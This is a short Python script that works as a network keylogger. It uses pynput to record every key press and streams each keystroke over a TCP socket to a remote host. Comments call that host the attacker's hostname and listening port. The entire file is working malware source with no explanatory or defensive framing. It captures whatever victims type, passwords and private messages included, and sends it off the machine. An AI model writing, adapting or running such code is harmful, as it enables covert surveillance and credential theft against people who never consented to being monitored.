import pynput
import socket

lhost = '3th1K' 		# change this to attackers hostname 
lport = 1234 		# change the port according to the attacker listening port

from pynput.keyboard import Key, Listener


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
	s.connect((lhost,lport))
	def send_key(k):
		s.sendall(k.encode('ascii'))
	def on_press(key):
		if 'Key.' in str(key):
			s_key = str(key).split('.')[1]
			if s_key == 'enter':
				s_key='\n'
			if s_key == 'space':
				s_key=' '
			send_key(s_key)
		else:
			send_key(str(key).replace("'",""))
	def on_release(key):
		pass

	with Listener(on_press=on_press, on_release=on_release) as l:
    		l.join()
